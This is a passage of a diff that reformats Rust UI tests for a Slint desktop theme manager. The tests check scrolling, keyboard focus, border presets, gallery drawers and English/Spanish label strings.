+                position: slint::LogicalPosition::new(1250.0, 30.0),
+            });
         for _ in 0..20 {
             i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
         }
@@ -16014,13 +16926,17 @@ fn borders_list_pane_scrolls_with_the_mouse_wheel() {
     focus(last, &win);
     park(&win);
     let follow_reference = win.window().take_snapshot().expect("follow reference");
-    save_slice_png(follow_reference.clone(), "borders_wheel_follow_reference.png");
+    save_slice_png(
+        follow_reference.clone(),
+        "borders_wheel_follow_reference.png",
+    );
 
-    win.window().dispatch_event(slint::platform::WindowEvent::PointerScrolled {
-        position: slint::LogicalPosition::new(700.0, 620.0),
-        delta_x: 0.0,
-        delta_y: -180.0,
-    });
+    win.window()
+        .dispatch_event(slint::platform::WindowEvent::PointerScrolled {
+            position: slint::LogicalPosition::new(700.0, 620.0),
+            delta_x: 0.0,
+            delta_y: -180.0,
+        });
     for _ in 0..140 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
@@ -16052,11 +16968,12 @@ fn borders_list_pane_scrolls_with_the_mouse_wheel() {
     // the previous tick that had not been travelled yet — "when scrolling you
     // do not reach the end". Same input, two pacings; the end states must agree.
     let wheel = |w: &crate::MainWindow, dy: f32| {
-        w.window().dispatch_event(slint::platform::WindowEvent::PointerScrolled {
-            position: slint::LogicalPosition::new(700.0, 620.0),
-            delta_x: 0.0,
-            delta_y: dy,
-        });
+        w.window()
+            .dispatch_event(slint::platform::WindowEvent::PointerScrolled {
+                position: slint::LogicalPosition::new(700.0, 620.0),
+                delta_x: 0.0,
+                delta_y: dy,
+            });
     };
     let frames = |n: usize| {
         for _ in 0..n {
@@ -16089,7 +17006,8 @@ fn borders_list_pane_scrolls_with_the_mouse_wheel() {
         "the wheel must accumulate the same travel however fast it arrives: {} ticks paced vs \
          the same {} ticks back to back ended {lost} units of ink apart, i.e. the `animate \
          viewport-y` is swallowing the distance of ticks that land mid-animation",
-        TICKS, TICKS
+        TICKS,
+        TICKS
     );
 }
 
@@ -16284,7 +17202,9 @@ fn save_list_follows_keyboard_focus_after_wheel() {
             .collect::<Vec<_>>(),
     )));
     win.set_theme_saved_ats(ModelRc::new(VecModel::from(vec![
-        SharedString::from("2026-01-01");
+        SharedString::from(
+            "2026-01-01"
+        );
         n
     ])));
     win.set_theme_is_actives(ModelRc::new(VecModel::from(vec![false; n])));
@@ -16314,8 +17234,8 @@ fn save_list_follows_keyboard_focus_after_wheel() {
 /// the helper can still name an absolute target.
 #[test]
 fn system_settings_follows_keyboard_focus_after_wheel() {
-    use slint::ComponentHandle as _;
     use slint::platform::Key;
+    use slint::ComponentHandle as _;
     let win = focus_open_system_panel();
     // A short window plus the restart row (and its banner) forces the settings
     // content to overflow, giving the follow real travel to lose.
@@ -16361,8 +17281,8 @@ fn system_settings_follows_keyboard_focus_after_wheel() {
 /// About block to the top when it owns the cursor.
 #[test]
 fn system_about_follows_keyboard_focus_after_wheel() {
-    use slint::ComponentHandle as _;
     use slint::platform::Key;
+    use slint::ComponentHandle as _;
     use slint::{ModelRc, SharedString, VecModel};
     let win = focus_open_system_panel();
     win.window().set_size(slint::PhysicalSize::new(1920, 400));
@@ -16451,16 +17371,24 @@ fn borders_list_wheel_reaches_the_end() {
     win.set_panel_section(1);
     let n = 14usize;
     win.set_border_titles(ModelRc::new(VecModel::from(
-        (0..n).map(|i| SharedString::from(format!("Preset {i:02}"))).collect::<Vec<_>>(),
+        (0..n)
+            .map(|i| SharedString::from(format!("Preset {i:02}")))
+            .collect::<Vec<_>>(),
     )));
     win.set_border_descs(ModelRc::new(VecModel::from(
-        (0..n).map(|_| SharedString::from("desc")).collect::<Vec<_>>(),
+        (0..n)
+            .map(|_| SharedString::from("desc"))
+            .collect::<Vec<_>>(),
     )));
     win.set_border_tags(ModelRc::new(VecModel::from(
-        (0..n).map(|_| SharedString::from("SYSTEM")).collect::<Vec<_>>(),
+        (0..n)
+            .map(|_| SharedString::from("SYSTEM"))
+            .collect::<Vec<_>>(),
     )));
     win.set_border_files(ModelRc::new(VecModel::from(
-        (0..n).map(|i| SharedString::from(format!("p{i:02}.lua"))).collect::<Vec<_>>(),
+        (0..n)
+            .map(|i| SharedString::from(format!("p{i:02}.lua")))
+            .collect::<Vec<_>>(),
     )));
     win.set_active_border_index(0);
 
@@ -16499,7 +17427,14 @@ fn borders_list_wheel_reaches_the_end() {
         count_buffer_diff(&top, &first) > 20000,
         "the burst must scroll the list at all"
     );
-    let still = count_buffer_diff_region(&first, &second, 0, 0, first.width() as usize, first.height() as usize);
+    let still = count_buffer_diff_region(
+        &first,
+        &second,
+        0,
+        0,
+        first.width() as usize,
+        first.height() as usize,
+    );
     assert!(
         still < 2000,
         "the wheel must REACH THE END of the list: a second identical burst moved {still} units \
@@ -16544,13 +17479,29 @@ fn borders_tune_renders_eight_slots() {
     win.set_is_panel_open(true);
     win.set_is_mutating(false);
     win.set_panel_section(1);
-    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Infinity")])));
-    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from("8-color neon")])));
+    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Infinity",
+    )])));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "8-color neon",
+    )])));
     win.set_border_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from("07_infinity.lua")])));
-    let eight: Vec<SharedString> = ["primary", "secondary", "tertiary", "error", "surface",
-        "surface_lowest", "primary", "secondary"].iter()
-        .map(|t| SharedString::from(format!("p:{t}").as_str())).collect();
+    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "07_infinity.lua",
+    )])));
+    let eight: Vec<SharedString> = [
+        "primary",
+        "secondary",
+        "tertiary",
+        "error",
+        "surface",
+        "surface_lowest",
+        "primary",
+        "secondary",
+    ]
+    .iter()
+    .map(|t| SharedString::from(format!("p:{t}").as_str()))
+    .collect();
     win.set_tune_active_colors(ModelRc::new(VecModel::from(eight)));
     win.set_tune_color_count(8);
     win.set_tune_angle(45);
@@ -16572,9 +17523,8 @@ fn borders_tune_renders_eight_slots() {
     let mut boxes = Vec::new();
     for (i, rgb) in CHIP_COLORS.iter().enumerate() {
         let painted = count_exact_color(&shot, *rgb, 8);
-        let bbox = exact_color_bbox(&shot, *rgb, 8).unwrap_or_else(|| {
-            panic!("chip {} must paint its resolved colour {rgb:?}", i + 1)
-        });
+        let bbox = exact_color_bbox(&shot, *rgb, 8)
+            .unwrap_or_else(|| panic!("chip {} must paint its resolved colour {rgb:?}", i + 1));
         // A 16×16 swatch paints ~196px through its 1px border and 4px radius
         // (measured), NOT up to 400: the band pins the size instead of merely
         // accepting it, so a chip that grew into a full card would fail here.
@@ -16685,10 +17635,16 @@ fn borders_preset_card_click_applies_the_file_not_the_title() {
     win.set_is_mutating(false);
     win.set_panel_section(1);
     // Translated title for DISPLAY, file name for APPLY.
-    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Cascada")])));
-    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from("soft gradient")])));
+    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Cascada",
+    )])));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "soft gradient",
+    )])));
     win.set_border_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from("01_cascade.lua")])));
+    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "01_cascade.lua",
+    )])));
     // Settle the 250ms card expansion so the first card is fully grown before
     // measuring the click target.
     focus_settle();
@@ -16788,11 +17744,13 @@ fn dispatch_pointer(
     y: f32,
     button: slint::platform::PointerEventButton,
 ) {
-    use slint::ComponentHandle as _;
     use slint::platform::WindowEvent;
+    use slint::ComponentHandle as _;
     let position = slint::LogicalPosition::new(x, y);
-    win.window().dispatch_event(WindowEvent::PointerPressed { position, button });
-    win.window().dispatch_event(WindowEvent::PointerReleased { position, button });
+    win.window()
+        .dispatch_event(WindowEvent::PointerPressed { position, button });
+    win.window()
+        .dispatch_event(WindowEvent::PointerReleased { position, button });
     for _ in 0..4 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
@@ -16938,13 +17896,19 @@ fn mark_theme_applied_never_reverts_theme_border_on_disk() {
     // Disk holds the theme's border (as left behind by the provider apply).
     let mut on_disk = crate::config::Config::default();
     on_disk.active_border_file = "theme-border.ron".to_string();
-    on_disk.save().expect("seed disk config with the theme border");
+    on_disk
+        .save()
+        .expect("seed disk config with the theme border");
 
     // In-memory state still carries the previous MANUAL border.
     let proj = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
     let engine = crate::engine::Engine::new(&proj);
     let config_dir = dirs::config_dir()
-        .or_else(|| std::env::var("HOME").ok().map(|h| std::path::PathBuf::from(h).join(".config")))
+        .or_else(|| {
+            std::env::var("HOME")
+                .ok()
+                .map(|h| std::path::PathBuf::from(h).join(".config"))
+        })
         .expect("sandboxed config dir");
     let tm = crate::theme_manager::ThemeManager::new(&config_dir);
     let mut stale = crate::config::Config::default();
@@ -16966,7 +17930,8 @@ fn mark_theme_applied_never_reverts_theme_border_on_disk() {
     // The in-memory copy must reflect the theme's border, so entering the
     // Borders section marks the theme's border with no restart.
     assert_eq!(
-        state.cfg().active_border_file, "theme-border.ron",
+        state.cfg().active_border_file,
+        "theme-border.ron",
         "in-memory state must refresh from disk after the apply"
     );
     assert_eq!(state.cfg().last_applied_theme, "SomeTheme");
@@ -17108,17 +18073,33 @@ fn theme_border_sync_replaces_stale_tune_pane_like_manual_pick() {
     win.set_gap_out(9);
 
     // Persisted geometry as the loaded theme wrote it into Config.
-    let persisted = crate::callbacks::BorderGeometry { size: 5, radius: 20, gap_in: 10, gap_out: 10 };
+    let persisted = crate::callbacks::BorderGeometry {
+        size: 5,
+        radius: 20,
+        gap_in: 10,
+        gap_out: 10,
+    };
     crate::sync_border_tune_pane(&win, &proj, "13_the_joker.lua", persisted);
 
-    assert_eq!(win.get_tune_color_count(), 3, "joker carries 3 gradient colours");
+    assert_eq!(
+        win.get_tune_color_count(),
+        3,
+        "joker carries 3 gradient colours"
+    );
     assert_eq!(win.get_tune_active_colors().row_count(), 3);
-    assert_eq!(win.get_tune_angle(), 45, "joker angle is 45, not the stale 40");
+    assert_eq!(
+        win.get_tune_angle(),
+        45,
+        "joker angle is 45, not the stale 40"
+    );
     assert!(
         !win.get_tune_inactive_color().is_empty(),
         "inactive colour must come from the preset"
     );
-    assert!(!win.get_tune_glow().is_empty(), "glow must come from the preset");
+    assert!(
+        !win.get_tune_glow().is_empty(),
+        "glow must come from the preset"
+    );
     assert!(win.get_tune_glow_enabled(), "joker shadow is enabled");
     // Geometry comes from persisted state, not a preset lookup: the pane must
     // agree with what the theme wrote into Config (and Hyprland renders).
@@ -17127,7 +18108,12 @@ fn theme_border_sync_replaces_stale_tune_pane_like_manual_pick() {
     assert_eq!(win.get_gap_in(), 10);
     assert_eq!(win.get_gap_out(), 10);
     assert_ne!(
-        (win.get_border_size(), win.get_corner_radius(), win.get_gap_in(), win.get_gap_out()),
+        (
+            win.get_border_size(),
+            win.get_corner_radius(),
+            win.get_gap_in(),
+            win.get_gap_out()
+        ),
         (2, 32, 5, 5),
         "the retired hard-coded default must never come back"
     );
@@ -17154,7 +18140,12 @@ fn theme_empty_border_clears_tune_pane_like_manual_deselect() {
     win.set_gap_in(3);
     win.set_gap_out(4);
 
-    let persisted = crate::callbacks::BorderGeometry { size: 5, radius: 20, gap_in: 10, gap_out: 10 };
+    let persisted = crate::callbacks::BorderGeometry {
+        size: 5,
+        radius: 20,
+        gap_in: 10,
+        gap_out: 10,
+    };
     crate::sync_border_tune_pane(&win, &proj, "", persisted);
 
     assert_eq!(win.get_tune_color_count(), 0);
@@ -17164,7 +18155,12 @@ fn theme_empty_border_clears_tune_pane_like_manual_deselect() {
     assert!(!win.get_tune_glow_enabled());
     assert!(!win.get_tune_dirty());
     assert_eq!(
-        (win.get_border_size(), win.get_corner_radius(), win.get_gap_in(), win.get_gap_out()),
+        (
+            win.get_border_size(),
+            win.get_corner_radius(),
+            win.get_gap_in(),
+            win.get_gap_out()
+        ),
         (7, 11, 3, 4),
         "clearing the pane is about the border, not the geometry sliders"
     );
@@ -17198,16 +18194,36 @@ fn borders_entry_seed_fills_pane_from_persisted_state() {
     win.set_gap_out(5);
 
     // Persisted state: the theme's border identity + the geometry it wrote.
-    let persisted = crate::callbacks::BorderGeometry { size: 5, radius: 20, gap_in: 10, gap_out: 10 };
+    let persisted = crate::callbacks::BorderGeometry {
+        size: 5,
+        radius: 20,
+        gap_in: 10,
+        gap_out: 10,
+    };
     crate::seed_borders_pane_from_persisted(&win, &proj, "13_the_joker.lua", persisted);
 
-    assert!(win.get_tune_color_count() > 0, "colour chips must come from the loaded border");
+    assert!(
+        win.get_tune_color_count() > 0,
+        "colour chips must come from the loaded border"
+    );
     assert_eq!(win.get_tune_active_colors().row_count(), 3);
     assert_eq!(win.get_tune_angle(), 45, "angle comes from the preset .lua");
-    assert!(win.get_tune_glow_enabled(), "glow state comes from the preset .lua");
-    assert_eq!(win.get_active_border_index(), 1, "the active card marker is reseeded");
+    assert!(
+        win.get_tune_glow_enabled(),
+        "glow state comes from the preset .lua"
+    );
     assert_eq!(
-        (win.get_border_size(), win.get_corner_radius(), win.get_gap_in(), win.get_gap_out()),
+        win.get_active_border_index(),
+        1,
+        "the active card marker is reseeded"
+    );
+    assert_eq!(
+        (
+            win.get_border_size(),
+            win.get_corner_radius(),
+            win.get_gap_in(),
+            win.get_gap_out()
+        ),
         (5, 20, 10, 10),
         "geometry shown equals the persisted values"
     );
@@ -17238,7 +18254,10 @@ fn startup_seeds_borders_pane_after_token_refresh_by_construction() {
     let state_new = code_only
         .find("let state = Arc::new(")
         .expect("main must build AppState");
-    assert!(refresh < state_new, "refresh_visual_state must precede AppState::new");
+    assert!(
+        refresh < state_new,
+        "refresh_visual_state must precede AppState::new"
+    );
     let startup_region = &code_only[refresh..state_new];
     assert!(
         startup_region.contains("seed_borders_pane_from_persisted"),
@@ -17256,7 +18275,13 @@ fn startup_seeds_borders_pane_after_token_refresh_by_construction() {
         .nth(1)
         .expect("main.rs must define the seed funnel");
     let funnel = funnel.split("\n}").next().unwrap_or(funnel);
-    for forbidden in ["cfg_mut", "apply_border", "apply_geometry", ".save(", "hypr_eval"] {
+    for forbidden in [
+        "cfg_mut",
+        "apply_border",
+        "apply_geometry",
+        ".save(",
+        "hypr_eval",
+    ] {
         assert!(
             !funnel.contains(forbidden),
             "seeding must not {forbidden}: it only pushes values into the window"
@@ -17321,7 +18346,7 @@ fn border_card_click_preserves_persisted_geometry_by_construction() {
 // dispatch the rail-handoff focus tests use.
 #[test]
 fn theme_transition_end_returns_focus_to_gallery() {
-    use slint::{ComponentHandle as _, platform::Key};
+    use slint::{platform::Key, ComponentHandle as _};
     // ── (a) Construction: the reseed must exist, bridged, guarded ──
     let shell = std::fs::read_to_string("ui/shell.slint").expect("ui/shell.slint must exist");
     assert!(
@@ -17348,7 +18373,10 @@ fn theme_transition_end_returns_focus_to_gallery() {
         "!root.gallery-bottom-open",
         "shell-kbd.focus()",
     ] {
-        assert!(handler.contains(guard), "transition-end handler must contain `{guard}`, got: {handler}");
+        assert!(
+            handler.contains(guard),
+            "transition-end handler must contain `{guard}`, got: {handler}"
+        );
     }
     let main = std::fs::read_to_string("ui/main.slint").expect("ui/main.slint must exist");
     assert!(
@@ -17504,7 +18532,10 @@ fn ctrl_arrows_deploy_the_drawers_in_both_gallery_styles() {
 // Rust `nav-move` drawer logic is invisible to them. This harness wires the
 // REAL production callbacks (`callbacks::setup_callbacks`) so a plain arrow
 // reaches the Rust handler exactly as it does in the app.
-fn window_with_production_callbacks() -> (crate::MainWindow, std::rc::Rc<std::cell::RefCell<crate::shell::Shell>>) {
+fn window_with_production_callbacks() -> (
+    crate::MainWindow,
+    std::rc::Rc<std::cell::RefCell<crate::shell::Shell>>,
+) {
     use slint::ComponentHandle as _;
     use std::sync::{Arc, Mutex};
 
@@ -17681,7 +18712,10 @@ fn plain_arrows_do_not_touch_an_open_gallery_drawer() {
 
     // Ctrl+Up opens the top drawer; gallery-keys takes the keyboard.
     focus_press_key_with_ctrl(&win, Key::UpArrow);
-    assert!(win.get_gallery_top_open(), "precondition: Ctrl+Up opens the top drawer");
+    assert!(
+        win.get_gallery_top_open(),
+        "precondition: Ctrl+Up opens the top drawer"
+    );
     focus_settle();
 
     // Plain Up must NOT close it any more.
@@ -17735,7 +18769,8 @@ fn save_owned_png(frame: &(Vec<u8>, usize, usize), name: &str) {
     let bare = first_is_file && parts.next().is_none();
     assert!(bare, "snapshot name must be a bare file name, got {name:?}");
     let path = render_run_dir().join(name);
-    let img = image::RgbaImage::from_raw(*w as u32, *h as u32, bytes.clone()).expect("owned snapshot");
+    let img =
+        image::RgbaImage::from_raw(*w as u32, *h as u32, bytes.clone()).expect("owned snapshot");
     img.save(&path)
         .unwrap_or_else(|e| panic!("save png {}: {e}", path.display()));
 }
@@ -17796,7 +18831,10 @@ fn plain_up_paints_no_drawer_but_ctrl_up_does() {
     );
 
     focus_press_key_with_ctrl(&win, Key::UpArrow);
-    assert!(win.get_gallery_top_open(), "Ctrl+Up must open the top drawer");
+    assert!(
+        win.get_gallery_top_open(),
+        "Ctrl+Up must open the top drawer"
+    );
     let ctrl = snapshot_owned(&win);
     save_owned_png(&ctrl, "ctrl_only_ctrl_up_slider.png");
     let ctrl_diff = count_owned_diff(&baseline, &ctrl);
@@ -17833,9 +18871,30 @@ fn a_persisted_mosaic_opens_on_the_mosaic_after_a_restart() {
     // A wall is present for BOTH frames, so the Mosaic frame really paints a
     // wall and the Slider frame really paints cards.
     win.set_gallery_mosaic_tiles(ModelRc::new(VecModel::from(vec![
-        crate::MosaicTileData { x: 40.0, y: 160.0, w: 600.0, h: 700.0, real_index: 0, delay_ms: 0 },
-        crate::MosaicTileData { x: 680.0, y: 160.0, w: 600.0, h: 700.0, real_index: 1, delay_ms: 0 },
-        crate::MosaicTileData { x: 1320.0, y: 160.0, w: 560.0, h: 700.0, real_index: 2, delay_ms: 0 },
+        crate::MosaicTileData {
+            x: 40.0,
+            y: 160.0,
+            w: 600.0,
+            h: 700.0,
+            real_index: 0,
+            delay_ms: 0,
+        },
+        crate::MosaicTileData {
+            x: 680.0,
+            y: 160.0,
+            w: 600.0,
+            h: 700.0,
+            real_index: 1,
+            delay_ms: 0,
+        },
+        crate::MosaicTileData {
+            x: 1320.0,
+            y: 160.0,
+            w: 560.0,
+            h: 700.0,
+            real_index: 2,
+            delay_ms: 0,
+        },
     ])));
     win.set_gallery_mosaic_total_pages(1);
     win.set_gallery_mosaic_page_numbers(ModelRc::new(VecModel::from(vec![1i32])));
@@ -17899,7 +18958,11 @@ fn overwrite_refresh_invalidates_only_the_overwritten_card() {
     // Sandboxed HOME so no real user config is touched.
     let _env = crate::test_utils::TempEnv::new();
     let config_dir = dirs::config_dir()
-        .or_else(|| std::env::var("HOME").ok().map(|h: String| std::path::PathBuf::from(h).join(".config")))
+        .or_else(|| {
+            std::env::var("HOME")
+                .ok()
+                .map(|h: String| std::path::PathBuf::from(h).join(".config"))
+        })
         .expect("sandboxed config dir");
     let themes_root = config_dir.join("hve").join("themes");
     for name in ["Alpha", "Beta"] {
@@ -17921,15 +18984,18 @@ fn overwrite_refresh_invalidates_only_the_overwritten_card() {
         .save(themes_root.join("Alpha").join("changed-bg.png"))
         .expect("wallpaper png");
 
-    let gallery_tm =
-        std::sync::Arc::new(std::sync::Mutex::new(crate::theme_manager::ThemeManager::new(&config_dir)));
-    assert_eq!(gallery_tm.lock().unwrap().list().unwrap_or_default().len(), 2);
+    let gallery_tm = std::sync::Arc::new(std::sync::Mutex::new(
+        crate::theme_manager::ThemeManager::new(&config_dir),
+    ));
+    assert_eq!(
+        gallery_tm.lock().unwrap().list().unwrap_or_default().len(),
+        2
+    );
 
     // Both cards carry stale bakes (as after any gallery rebuild).
     fn baked_row(name: &str) -> crate::GalleryCardData {
-        let img = slint::Image::from_rgba8(
-            slint::SharedPixelBuffer::<slint::Rgba8Pixel>::new(4, 4),
-        );
+        let img =
+            slint::Image::from_rgba8(slint::SharedPixelBuffer::<slint::Rgba8Pixel>::new(4, 4));
         crate::GalleryCardData {
             name: SharedString::from(name),
             saved_at: SharedString::from(""),
@@ -17956,8 +19022,7 @@ fn overwrite_refresh_invalidates_only_the_overwritten_card() {
         baked_row("Alpha"),
         baked_row("Beta"),
     ])));
-    let noop_mosaic: std::sync::Arc<dyn Fn(bool) + Send + Sync> =
-        std::sync::Arc::new(|_| {});
+    let noop_mosaic: std::sync::Arc<dyn Fn(bool) + Send + Sync> = std::sync::Arc::new(|_| {});
     let noop_slice: std::sync::Arc<dyn Fn() + Send + Sync> = std::sync::Arc::new(|| {});
     let invalidated: std::collections::HashSet<String> =
         ["Alpha".to_string()].into_iter().collect();
@@ -17981,8 +19046,14 @@ fn overwrite_refresh_invalidates_only_the_overwritten_card() {
                 && row.slat_expanded_image.size().width > 0;
         }
     }
-    assert!(alpha_blank, "overwritten Alpha must be blank (queued for re-bake)");
-    assert!(beta_baked, "untouched Beta must keep its bakes (no mass invalidation)");
+    assert!(
+        alpha_blank,
+        "overwritten Alpha must be blank (queued for re-bake)"
+    );
+    assert!(
+        beta_baked,
+        "untouched Beta must keep its bakes (no mass invalidation)"
+    );
     // The changed background still resolves: the scheduler will re-bake it.
     assert!(
         crate::shell::gallery::thumbs::plan_preview_source(&themes_root.join("Alpha")).is_some(),
@@ -18101,22 +19172,35 @@ fn custom_palette_apply_schedules_bounded_focus_restores() {
     // Sandboxed HOME so no real user config is touched.
     let _env = crate::test_utils::TempEnv::new();
     let config_dir = dirs::config_dir()
-        .or_else(|| std::env::var("HOME").ok().map(|h: String| std::path::PathBuf::from(h).join(".config")))
+        .or_else(|| {
+            std::env::var("HOME")
+                .ok()
+                .map(|h: String| std::path::PathBuf::from(h).join(".config"))
+        })
         .expect("sandboxed config dir");
     let themes_root = config_dir.join("hve").join("themes");
     // Custom palette: source.txt names it AND palette.json exists — this is
     // what arms the provider's late re-assert (custom or community, both
     // restore as custom when the file is there).
-    let custom_dir = themes_root.join("CustomTheme").join("providers").join("noctalia-v5");
+    let custom_dir = themes_root
+        .join("CustomTheme")
+        .join("providers")
+        .join("noctalia-v5");
     std::fs::create_dir_all(&custom_dir).expect("custom theme dir");
     std::fs::write(custom_dir.join("source.txt"), "custom MyPal").expect("source.txt");
     std::fs::write(custom_dir.join("palette.json"), "{}").expect("palette.json");
     // Builtin scheme with no palette file: arms nothing.
-    let builtin_dir = themes_root.join("BuiltinTheme").join("providers").join("noctalia-v5");
+    let builtin_dir = themes_root
+        .join("BuiltinTheme")
+        .join("providers")
+        .join("noctalia-v5");
     std::fs::create_dir_all(&builtin_dir).expect("builtin theme dir");
     std::fs::write(builtin_dir.join("source.txt"), "builtin Fancy").expect("source.txt");
     // Wallpaper scheme: arms nothing.
-    let wall_dir = themes_root.join("WallTheme").join("providers").join("noctalia-v5");
+    let wall_dir = themes_root
+        .join("WallTheme")
+        .join("providers")
+        .join("noctalia-v5");
     std::fs::create_dir_all(&wall_dir).expect("wallpaper theme dir");
     std::fs::write(wall_dir.join("source.txt"), "wallpaper").expect("source.txt");
 
@@ -18148,11 +19232,23 @@ fn custom_palette_apply_schedules_bounded_focus_restores() {
     let win = crate::MainWindow::new().unwrap();
     crate::schedule_post_apply_focus_restores(&win.as_weak(), "CustomTheme", &themes_root);
     advance_ms(3000);
-    assert_eq!(win.get_focus_restore_nonce(), 1, "first ping lands after the ~2 s re-assert set");
+    assert_eq!(
+        win.get_focus_restore_nonce(),
+        1,
+        "first ping lands after the ~2 s re-assert set"
+    );
     advance_ms(2000);
-    assert_eq!(win.get_focus_restore_nonce(), 2, "second ping covers the ~4 s check");
+    assert_eq!(
+        win.get_focus_restore_nonce(),
+        2,
+        "second ping covers the ~4 s check"
+    );
     advance_ms(2000);
-    assert_eq!(win.get_focus_restore_nonce(), 3, "third ping covers the ~6 s check");
+    assert_eq!(
+        win.get_focus_restore_nonce(),
+        3,
+        "third ping covers the ~6 s check"
+    );
 
     let plain = crate::MainWindow::new().unwrap();
     crate::schedule_post_apply_focus_restores(&plain.as_weak(), "BuiltinTheme", &themes_root);
@@ -18170,7 +19266,7 @@ fn custom_palette_apply_schedules_bounded_focus_restores() {
 // a bump keeps Enter applying the focused card.
 #[test]
 fn focus_restore_bump_never_steals_panel_keyboard() {
-    use slint::{ComponentHandle as _, platform::Key};
+    use slint::{platform::Key, ComponentHandle as _};
     // ── Construction: the nonce reseed must exist, bridged, guarded ──
     let shell = std::fs::read_to_string("ui/shell.slint").expect("ui/shell.slint must exist");
     assert!(
@@ -18193,7 +19289,10 @@ fn focus_restore_bump_never_steals_panel_keyboard() {
         "!root.gallery-bottom-open",
         "shell-kbd.focus()",
     ] {
-        assert!(handler.contains(guard), "restore-nonce handler must contain `{guard}`, got: {handler}");
+        assert!(
+            handler.contains(guard),
+            "restore-nonce handler must contain `{guard}`, got: {handler}"
+        );
     }
     let main = std::fs::read_to_string("ui/main.slint").expect("ui/main.slint must exist");
     assert!(
@@ -18216,12 +19315,20 @@ fn focus_restore_bump_never_steals_panel_keyboard() {
         move |idx| applied.borrow_mut().push(idx)
     });
     focus_press_key(&win, Key::Return);
-    assert_eq!(*applied.borrow(), vec![2], "baseline: gallery Enter applies");
+    assert_eq!(
+        *applied.borrow(),
+        vec![2],
+        "baseline: gallery Enter applies"
+    );
 
     // A restore ping on the bare gallery: Enter keeps applying.
     win.set_focus_restore_nonce(win.get_focus_restore_nonce() + 1);
     focus_press_key(&win, Key::Return);
-    assert_eq!(*applied.borrow(), vec![2, 2], "restore ping must keep gallery Enter alive");
+    assert_eq!(
+        *applied.borrow(),
+        vec![2, 2],
+        "restore ping must keep gallery Enter alive"
+    );
 
     // Same ping with the panel open: Enter belongs to the panel.
     win.set_is_panel_open(true);
@@ -18337,12 +19444,28 @@ fn the_save_and_filters_text_defaults_are_todays_english() {
     // which the map test above pins byte for byte.
     for (file, prop, en) in [
         ("save_text.slint", "save-title", "Save Current Look"),
-        ("save_text.slint", "save-desc", "Save your current setup as a theme. It appears instantly in the Gallery — no restart."),
-        ("save_text.slint", "kbd-hint", "Tip: ↑↓ pick theme • Enter applies • Esc closes • Tab next section"),
+        (
+            "save_text.slint",
+            "save-desc",
+            "Save your current setup as a theme. It appears instantly in the Gallery — no restart.",
+        ),
+        (
+            "save_text.slint",
+            "kbd-hint",
+            "Tip: ↑↓ pick theme • Enter applies • Esc closes • Tab next section",
+        ),
         ("filters_text.slint", "title", "Filters"),
-        ("filters_text.slint", "desc", "Pick a shader — instantly applied. Repick active to turn off."),
+        (
+            "filters_text.slint",
+            "desc",
+            "Pick a shader — instantly applied. Repick active to turn off.",
+        ),
         ("filters_text.slint", "empty", "No shader presets found."),
-        ("filters_text.slint", "kbd-hint", "↑↓ navigate • Enter/Space apply • Tab pick→next • Esc back"),
+        (
+            "filters_text.slint",
+            "kbd-hint",
+            "↑↓ navigate • Enter/Space apply • Tab pick→next • Esc back",
+        ),
     ] {
         let src = &files.iter().find(|(f, _)| *f == file).expect(file).1;
         assert!(
@@ -18362,12 +19485,32 @@ fn the_save_and_filters_sections_read_every_label_from_their_text_globals() {
 
     let rows: [(&str, &str, &str, &str); 7] = [
         ("save-title", "Save Current Look", "SaveText", SAVE),
-        ("save-desc", "Save your current setup as a theme. It appears instantly in the Gallery — no restart.", "SaveText", SAVE),
-        ("kbd-hint", "Tip: ↑↓ pick theme • Enter applies • Esc closes • Tab next section", "SaveText", SAVE),
+        (
+            "save-desc",
+            "Save your current setup as a theme. It appears instantly in the Gallery — no restart.",
+            "SaveText",
+            SAVE,
+        ),
+        (
+            "kbd-hint",
+            "Tip: ↑↓ pick theme • Enter applies • Esc closes • Tab next section",
+            "SaveText",
+            SAVE,
+        ),
         ("title", "Filters", "FiltersText", FILTERS),
-        ("desc", "Pick a shader — instantly applied. Repick active to turn off.", "FiltersText", FILTERS),
+        (
+            "desc",
+            "Pick a shader — instantly applied. Repick active to turn off.",
+            "FiltersText",
+            FILTERS,
+        ),
         ("empty", "No shader presets found.", "FiltersText", FILTERS),
-        ("kbd-hint", "↑↓ navigate • Enter/Space apply • Tab pick→next • Esc back", "FiltersText", FILTERS),
+        (
+            "kbd-hint",
+            "↑↓ navigate • Enter/Space apply • Tab pick→next • Esc back",
+            "FiltersText",
+            FILTERS,
+        ),
     ];
 
     let unbound: Vec<&str> = rows
@@ -18540,7 +19683,11 @@ fn every_save_and_filters_label_has_its_own_spanish_text() {
     let twinned: Vec<&str> = save_labels()
         .iter()
         .map(|(name, _, en, es)| (*name, *en, *es))
-        .chain(filters_labels().iter().map(|(name, _, en, es)| (*name, *en, *es)))
+        .chain(
+            filters_labels()
+                .iter()
+                .map(|(name, _, en, es)| (*name, *en, *es)),
+        )
         .filter(|(_, en, es)| en == es)
         .map(|(name, _, _)| name)
         .collect();
@@ -18643,12 +19790,17 @@ fn both_language_maps_carry_every_system_string() {
     let es = crate::tr::Tr::with_lang("es");
     let wrong: Vec<String> = system_rows()
         .iter()
-        .flat_map(|(_, key, en_want, es_want)| [("en", en.tr(key), *en_want), ("es", es.tr(key), *es_want)])
+        .flat_map(|(_, key, en_want, es_want)| {
+            [("en", en.tr(key), *en_want), ("es", es.tr(key), *es_want)]
+        })
         .filter_map(|(lang, got, want)| {
